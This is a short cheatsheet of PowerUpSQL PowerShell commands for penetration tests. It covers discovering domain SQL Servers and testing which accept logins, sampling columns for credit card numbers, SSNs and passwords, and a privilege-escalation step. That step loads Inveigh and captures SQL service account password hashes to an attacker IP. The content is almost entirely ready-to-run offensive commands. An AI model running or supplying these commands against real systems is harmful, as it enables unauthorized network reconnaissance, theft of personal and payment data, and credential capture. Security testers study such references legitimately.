# PowerUpSQL Cheatsheet
Below is a list of some of the most common PowerUpSQL functions used during pentests.

## Discovery Cheats
|Description|Command|
|:--------------------------------|:-----------|
|Discover Local SQL Server Instances |`Get-SQLInstanceLocal -Verbose`
|Discover Remote SQL Server Instances | `Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1` <br>`Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose`
|Discover domain SQL Server Instances | `Get-SQLInstanceDomain -Verbose`
|Discover domain accounts used to run multiple SQL Servers | `Get-SQLInstanceDomain -Verbose | Where-Object {$_.DomainAccount -notlike "*$"} | Group-Object DomainAccount | Select Count, Name | Sort-Object Name -Descending`
|List SQL Servers using a specific domain account| `Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc`
|Get a list of domain SQL servers that can be logged into|`$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}`<br>`$Targets`

## Data Gathering Cheats
|Description|Command|
|:--------------------------------|:-----------|
|Grab basic server information | `$Targets | Get-SQLServerInfoThreaded -Threads 10 -Verbose`
|Grab list of non-default database | `$Targets | Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults`
|Find sensitive data based on column name |`$Targets |  Get-SQLColumnSampleDataThreaded –Verbose –Threads 10–Keyword "credit,ssn,password" –SampleSize 2 –ValidateCC –NoDefaults`
|Find sensitive data based on column name, but only target databases with transparent encryption|`$Targets | Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults | Where-Object {$_.is_encrypted –eq “TRUE”} | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults`

## Privilege Escalation Cheats
`Import-Module C:\PowerUpSQL-master\PowerUpSQL.psd1
Import-Module C:\PowerUpSQL-master\Scripts\Pending\Get-SQLServiceAccountPwHashes.ps1
Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1 
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 2 -CaptureIp 10.1.1.1`